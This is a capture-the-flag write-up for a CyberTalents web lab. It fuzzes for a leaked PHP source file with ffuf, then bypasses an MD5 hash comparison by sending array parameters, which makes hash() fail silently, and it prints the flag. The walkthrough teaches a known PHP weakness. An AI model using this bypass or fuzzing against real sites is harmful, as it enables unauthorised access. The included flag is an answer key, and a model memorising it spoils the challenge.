# ConCmarks

---

<img width="1894" height="427" alt="image" src="https://github.com/user-attachments/assets/c83f488d-4138-4fa3-9a71-68377595058a" />

### in source code found :

<img width="1276" height="262" alt="image" src="https://github.com/user-attachments/assets/602bf9fa-3e38-4b57-9006-cd955d16d0f3" />

```
R3v3r53Fuck
```

```
curl -s  http://cdcamxwl32pue3e6mekgvd1gf9zrq873o8mombwzy-web.cybertalentslabs.com/
```

```
<!--FILE=> sourceXXXX -->
<!--XXXX are numbers > 7000 & < 9000 -->

```

```
ffuf -u "http://cdcamxwl32pue3e6mekgvd1gf9zrq873o8mombwzy-web.cybertalentslabs.com/sourceFUZZ" \
  -w <(seq 7000 9000) \
  -fc 404
```

<img width="1111" height="531" alt="image" src="https://github.com/user-attachments/assets/dec269a5-b80c-4b64-af20-327766f2c67e" />

```
curl  -s http://cdcamxwl32pue3e6mekgvd1gf9zrq873o8mombwzy-web.cybertalentslabs.com/source8020  
```

<img width="1104" height="472" alt="image" src="https://github.com/user-attachments/assets/ded8efbf-25c4-499f-b583-77bffdded304" />

```php
include('flag.php');

if( @$_GET['n1'] && @$_GET['n2'] )
{
        $input1 = $_GET['n1'];
        $input2 = $_GET['n2'];
        if( $input1 !== $input2 && @hash("md5", $salt.$input1) === @hash("md5", $salt. $input2) )
        {
                echo $flag;

        } else {

                echo "Sorry this value not valid.";
        }
} else{
        exit();
}

```

---

```
curl -s "http://cdcamxwl32pue3e6mekgvd1gf9zrq873o8mombwzy-web.cybertalentslabs.com/?n1[]=1&n2[]=2"
```

<img width="1252" height="248" alt="image" src="https://github.com/user-attachments/assets/cc4110dd-a991-45ff-8182-890f3bd23033" />

```
FLAG{K0nC473n4710N_!5_50_C00l}
```

What Happened:
--------------

When you sent: `?n1[]=1&n2[]=2`

1.  `n1[]=1` creates an array: `$_GET['n1'] = array(1)`

2.  `n2[]=2` creates an array: `$_GET['n2'] = array(2)`

3.  These are different arrays (condition 1 satisfied: `$input1 !== $input2`)

4.  When PHP tries: `hash("md5", $salt.$input1)`

    -   `$salt.$input1` tries to concatenate string + array → TYPE ERROR

    -   `@` suppresses the error → returns `FALSE`

5.  Same for `hash("md5", $salt.$input2)` → also returns `FALSE`

6.  `FALSE === FALSE` is `TRUE` (condition 2 satisfied)

7.  FLAG PRINTED!

